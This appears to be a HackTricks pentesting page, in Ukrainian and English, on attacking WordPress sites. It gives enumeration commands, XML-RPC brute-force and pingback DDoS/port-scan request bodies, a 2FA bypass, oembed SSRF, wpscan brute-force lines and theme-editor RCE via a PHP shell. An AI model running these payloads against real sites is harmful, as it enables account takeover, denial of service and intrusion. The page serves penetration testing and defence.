# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** —Ç–æ–∂ —è–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ —è–∫–∏–π—Å—å php —Ñ–∞–π–ª—É —Ç–µ–º–∏ —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –π–º–æ–≤—ñ—Ä–Ω–æ –≤–∏ –±—É–¥–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **theme twentytwelve** –≤–∏ –º–æ–∂–µ—Ç–µ **access** the **404.php** file –≤: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ root –ø–∞—Ä–æ–ª—å –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **–û—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏ WordPress**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –≤–µ—Ä—Å—ñ—è WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ email –ø—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ‚Äî —Ñ–∞–π–ª, —è–∫–∏–π —Ä–µ–∞–ª—ñ–∑—É—î —Ñ—É–Ω–∫—Ü—ñ—é WordPress –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –¥–∞–Ω–∏—Ö –∑ HTTP —è–∫ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–Ω–∏–º –º–µ—Ö–∞–Ω—ñ–∑–º–æ–º —Ç–∞ XML —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º–æ–º –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¢–∞–∫–∏–π —Ç–∏–ø –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –±—É–≤ –∑–∞–º—ñ–Ω–µ–Ω–∏–π WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- –ü–∞–ø–∫–∞ `wp-content` ‚Äî –æ—Å–Ω–æ–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ themes.
- `wp-content/uploads/` ‚Äî –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è, –∫—É–¥–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –±—É–¥—å-—è–∫—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` ‚Äî –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è core —Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, JavaScript —Ñ–∞–π–ª–∏ —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` –£ Wordpress –≤–µ—Ä—Å—ñ—è—Ö 5.5 —ñ –≤–∏—â–µ, Worpress –≥–µ–Ω–µ—Ä—É—î —Ñ–∞–π–ª sitemap XML –∑ —É—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –∑–∞–ø–∏—Å—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**Post exploitation**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ —ñ–º'—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, authentication keys and salts, —ñ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó DEBUG —Ä–µ–∂–∏–º—É, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –ø—Ä–∏ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—ñ.

### –ü—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **Administrator**
- **Editor**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ —ñ —á—É–∂–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **Author**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –∑–∞–ø–∏—Å–∞–º–∏
- **Contributor**: –ü–∏—à–µ —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –∑–∞–ø–∏—Å–∞–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **Subscriber**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –ø–æ—Å—Ç–∏ —Ç–∞ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **–ü–∞—Å–∏–≤–Ω–∞ —Ä–æ–∑–≤—ñ–¥–∫–∞**

### **–û—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é WordPress**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–í —Å–µ—Ä–µ–¥–∏–Ω—ñ **source code** —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- –§–∞–π–ª–∏ CSS (link)

![](<../../images/image (533).png>)

- –§–∞–π–ª–∏ JavaScript

![](<../../images/image (524).png>)

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–µ–º
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –í–∏—Ç—è–≥ –≤–µ—Ä—Å—ñ–π –∑–∞–≥–∞–ª–æ–º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## –ê–∫—Ç–∏–≤–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è

### –ü–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏

–ô–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –º–æ–∂–ª–∏–≤—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ –≤—Å—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∞–∫—Ç–∏–≤–Ω–æ Brute Force —Å–ø–∏—Å–æ–∫ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —ñ —Ç–µ–º** (—Å–ø–æ–¥—ñ–≤–∞—î–º–æ—Å—å, –¥–ª—è –Ω–∞—Å —ñ—Å–Ω—É—é—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID Brute:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –≤–∞–ª—ñ–¥–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ WordPress —Å–∞–π—Ç—É —à–ª—è—Ö–æ–º Brute Forcing ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ ‚Äî **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id ‚Äî **–¥—ñ–π—Å–Ω–∏–π**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å ‚Äî **400**, —Ç–æ id ‚Äî **–Ω–µ–¥—ñ–π—Å–Ω–∏–π**.

- **wp-json:** –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏–∫–æ–Ω–∞–≤—à–∏ –∑–∞–ø–∏—Ç:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–©–µ –æ–¥–∏–Ω endpoint `/wp-json/`, —è–∫–∏–π –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Ü–µ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

Also note that **/wp-json/wp/v2/pages** –º–æ–∂–µ leak IP-–∞–¥—Ä–µ—Å–∏.

- **Login username enumeration**: –ü—Ä–∏ –≤—Ö–æ–¥—ñ –≤ **`/wp-login.php`** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** —î **—Ä—ñ–∑–Ω–∏–º** —ñ –≤–∫–∞–∑—É—î, —á–∏ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ—Å–Ω—É—î —á–∏ –Ω—ñ**.

### XML-RPC

–Ø–∫—â–æ `xml-rpc.php` –∞–∫—Ç–∏–≤–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ credentials brute-force –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–ø—É—Å–∫—É DoS-–∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –∞–∫—Ç–∏–≤–Ω–∏–π, —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _**/xmlrpc.php**_ —ñ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —Ü–µ–π –∑–∞–ø–∏—Ç:

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** ‚Äî —Ü–µ –¥–µ—è–∫—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è brute-force credentials. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"Incorrect username or password"_ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –º–∞—î –∑'—è–≤–ª—è—Ç–∏—Å—è, —è–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–µ–¥—ñ–π—Å–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
–¢–∞–∫–æ–∂ —î **—à–≤–∏–¥—à–∏–π —Å–ø–æ—Å—ñ–±** –≤–∏–∫–æ–Ω–∞—Ç–∏ brute-force credentials, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **`system.multicall`**, –æ—Å–∫—ñ–ª—å–∫–∏ –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ creds –≤ –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ —î –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏–º, —Ç–æ–º—É –≤—ñ–Ω –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω—ñ creds, –∞–ª–µ –æ—Å–Ω–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–∏–π 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php, —â–æ–± —É–≤—ñ–π—Ç–∏ –∑ —Ü–∏–º–∏ creds, –º–∏–Ω–∞—é—á–∏ 2FA**. –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –¥—ñ—Å—Ç–∞—Ç–∏—Å—è –¥–æ RCE, —è–∫ –ø–æ—è—Å–Ω—é—î Ippsec —É [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ö–æ—Å—Ç/–ø–æ—Ä—Ç.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** Wordpress **—Å–∞–π—Ç—ñ–≤** –æ–¥–Ω–æ—á–∞—Å–Ω–æ **–∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è** –¥–æ –æ–¥–Ω—ñ—î—ó **–ª–æ–∫–∞—Ü—ñ—ó** (—Ç–æ–º—É —Ç–∞–º —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å—Å—è **DDoS**), –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **Wordpress** —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **–º–µ—Ä–µ–∂—É** (–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–µ**, –Ω—ñ–∂ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

–¶–µ–π —Ñ–∞–π–ª –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–æ—Ä–µ–Ω—ñ —Å–∞–π—Ç—É Wordpress: **`/wp-cron.php`**\
–ö–æ–ª–∏ –¥–æ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É **–¥–æ—Å—Ç—É–ø–∞—é—Ç—å—Å—è**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è ¬´**–≤–∞–∂–∫–∏–π**¬ª MySQL **–∑–∞–ø–∏—Ç**, —Ç–æ–º—É –≤—ñ–Ω –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏** –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è **DoS**.\
–¢–∞–∫–æ–∂, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫—É Wordpress), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö —ñ–∑ –≤–µ–ª–∏–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–º–∫–Ω—É—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥—ñ—ó –∑ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–º —ñ–Ω—Ç–µ—Ä–≤–∞–ª–æ–º (–±–µ–∑ —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

–°–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ‚Äî —ñ —Å–∞–π—Ç Wordpress –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –≤–∞—Å.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —ñ—Å–Ω—É—î **methodName: pingback.ping** —Ç–∞ —à–ª—è—Ö **/wp-json/oembed/1.0/proxy**, —ñ —è–∫—â–æ —Ç–∞–∫, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è exploit —ó—Ö.

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –±—ñ—Ç–∞

–¶–µ —Ä–∞–¥—à–µ –∫—É—Ä–π–æ–∑, –Ω—ñ–∂ —Ä–µ–∞–ª—å–Ω–∞ –∞—Ç–∞–∫–∞. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) –º–æ–∂–Ω–∞ –±—É–ª–æ —ñ–Ω–≤–µ—Ä—Ç—É–≤–∞—Ç–∏ 1 –±—ñ—Ç —É –±—É–¥—å-—è–∫–æ–º—É wordpress —Ñ–∞–π–ª—ñ. –¢–æ–±—Ç–æ –º–æ–∂–Ω–∞ –±—É–ª–æ —ñ–Ω–≤–µ—Ä—Ç—É–≤–∞—Ç–∏ –±—ñ—Ç —É –ø–æ–∑–∏—Ü—ñ—ó `5389` —Ñ–∞–π–ª—É `/var/www/html/wp-includes/user.php`, —â–æ–± –∑–∞–º—ñ–Ω–∏—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—é NOT (`!`) –Ω–∞ NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **–ü–∞–Ω–µ–ª—å RCE**

**–ó–º—ñ–Ω–∞ php-—Ñ–∞–π–ª—É —É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ–π —Ç–µ–º—ñ (–ø–æ—Ç—Ä—ñ–±–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–∞–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

